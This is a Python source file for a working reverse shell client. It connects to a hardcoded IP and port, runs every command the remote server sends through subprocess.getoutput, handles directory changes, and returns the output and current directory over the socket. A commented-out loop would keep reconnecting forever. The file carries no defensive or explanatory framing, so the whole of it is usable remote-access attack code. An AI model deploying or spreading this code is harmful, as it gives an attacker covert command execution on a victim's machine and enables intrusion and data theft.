import socket
import os
import subprocess
import sys
import re
import tqdm


SERVER_HOST = "10.100.102.94"
SERVER_PORT = 5004
BUFFER_SIZE = 1440  # max size of messages, setting to 1440 after experimentation, MTU size
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"


class Client:

    def __init__(self, host, port, verbose=False):
        self.host = host
        self.port = port
        self.verbose = verbose
        # connect to the server
        self.socket = self.connect_to_server()
        # the current working directory
        self.cwd = None

    def connect_to_server(self, custom_port=None):
        # create the socket object
        s = socket.socket()
        # connect to the server
        if custom_port:
            port = custom_port
        else:
            port = self.port
        if self.verbose:
            print(f"Connecting to {self.host}:{port}")
        s.connect((self.host, port))
        if self.verbose:
            print("Connected.")
        return s

    def start(self):
        # get the current directory
        self.cwd = os.getcwd()
        self.socket.send(self.cwd.encode())

        while True:
            # receive the command from the server
            command = self.socket.recv(BUFFER_SIZE).decode()
            # execute the command
            output = self.handle_command(command)
            if output == "abort":
                # break out of the loop if "abort" command is executed
                break
            elif output in ["exit", "quit"]:
                continue
            # get the current working directory as output
            self.cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}{SEPARATOR}{self.cwd}"
            self.socket.sendall(message.encode())

        # close client connection
        self.socket.close()

    def handle_command(self, command):
        if self.verbose:
            print(f"Executing command: {command}")
        if command.lower() in ["exit", "quit"]:
            output = "exit"
        elif command.lower() == "abort":
            output = "abort"
        elif (match := re.search(r"cd\s*(.*)", command)):
            output = self.change_directory(match.group(1))
        # here we can add the commands that we want to execute on the client side....
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
        return output

    def change_directory(self, path):
        if not path:
            # path is empty, simply do nothing
            return ""
        try:
            os.chdir(path)
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
        return output


if __name__ == "__main__":
    # while True:
    #     # keep connecting to the server forever
    #     try:
    #         client = Client(SERVER_HOST, SERVER_PORT, verbose=True)
    #         client.start()
    #     except Exception as e:
    #         print(e)
    client = Client(SERVER_HOST, SERVER_PORT)
    client.start()
